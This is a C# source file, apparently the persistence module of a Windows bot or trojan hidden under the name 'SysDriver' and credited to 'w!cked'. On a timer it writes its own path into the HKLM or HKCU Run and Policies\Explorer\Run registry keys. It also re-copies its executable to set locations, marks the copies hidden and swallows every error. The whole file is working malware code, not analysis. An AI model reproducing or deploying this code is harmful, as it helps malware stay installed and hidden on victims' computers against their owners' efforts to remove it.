using System;
using System.IO;
using System.Diagnostics;
using System.Timers;
using Microsoft.Win32;

namespace SysDriver
{
    /* Copyright © 2010 w!cked */

    class cPersistent
    {
        private Timer checkTimer = new Timer();
        RegistryKey rKey;
        private string sSelfPath = Process.GetCurrentProcess().MainModule.FileName;

        public void loadPersistent()
        {
            checkTimer.Interval = (int)(cMain.ConfigClass.iPersistentInterval * 0x3e8);
            checkTimer.Elapsed += new ElapsedEventHandler(CheckProcedure);
            checkTimer.Start();
        }

        public void stopPersistent()
        {
            checkTimer.Stop();
            checkTimer.Dispose();
        }

        private void CheckProcedure(object source, ElapsedEventArgs eArgs)
        {
            if (cMain.ConfigClass.bAdminStatus == true)
            {
                try
                {
                    rKey = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true);
                    if (rKey.Equals(cMain.ConfigClass.sRegName[0]))
                    {
                        if (rKey.GetValue(cMain.ConfigClass.sRegName[0]).ToString() != ('"' + cMain.ConfigClass.sFilePath[0] + '"'))
                        {
                            rKey.SetValue(cMain.ConfigClass.sRegName[0], ('"' + cMain.ConfigClass.sFilePath[0] + '"'));
                        }
                    }
                    else
                    {
                        rKey.SetValue(cMain.ConfigClass.sRegName[0], ('"' + cMain.ConfigClass.sFilePath[0] + '"'));
                    }
                }
                catch { }

                try
                {
                    rKey = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run", true);
                    if (rKey.Equals(cMain.ConfigClass.sRegName[1]))
                    {
                        if (rKey.GetValue(cMain.ConfigClass.sRegName[1]).ToString() != ('"' + cMain.ConfigClass.sFilePath[1] + '"'))
                        {
                            rKey.SetValue(cMain.ConfigClass.sRegName[1], ('"' + cMain.ConfigClass.sFilePath[1] + '"'));
                        }
                    }
                    else
                    {
                        rKey.SetValue(cMain.ConfigClass.sRegName[1], ('"' + cMain.ConfigClass.sFilePath[1] + '"'));
                    }
                }
                catch { }
            }
            else
            {
                try
                {
                    rKey = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true);
                    if (rKey.Equals(cMain.ConfigClass.sRegName[0]))
                    {
                        if (rKey.GetValue(cMain.ConfigClass.sRegName[0]).ToString() != ('"' + cMain.ConfigClass.sFilePath[0] + '"'))
                        {
                            rKey.SetValue(cMain.ConfigClass.sRegName[0], ('"' + cMain.ConfigClass.sFilePath[0] + '"'));
                        }
                    }
                    else
                    {
                        rKey.SetValue(cMain.ConfigClass.sRegName[0], ('"' + cMain.ConfigClass.sFilePath[0] + '"'));
                    }
                }
                catch { }

                try
                {
                    rKey = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run", true);
                    if (rKey.Equals(cMain.ConfigClass.sRegName[1]))
                    {
                        if (rKey.GetValue(cMain.ConfigClass.sRegName[1]).ToString() != ('"' + cMain.ConfigClass.sFilePath[1] + '"'))
                        {
                            rKey.SetValue(cMain.ConfigClass.sRegName[1], ('"' + cMain.ConfigClass.sFilePath[1] + '"'));
                        }
                    }
                    else
                    {
                        rKey.SetValue(cMain.ConfigClass.sRegName[1], ('"' + cMain.ConfigClass.sFilePath[1] + '"'));
                    }
                }
                catch { }
            }

            try
            {
                foreach (string sPath in cMain.ConfigClass.sFilePath)
                {
                    if (cMain.FunctionClass.checkFile(sPath) == false)
                    {
                        File.Copy(sSelfPath, sPath);
                        File.SetAttributes(sPath, FileAttributes.Hidden);
                    }
                }
            }
            catch { }
        }
    }
}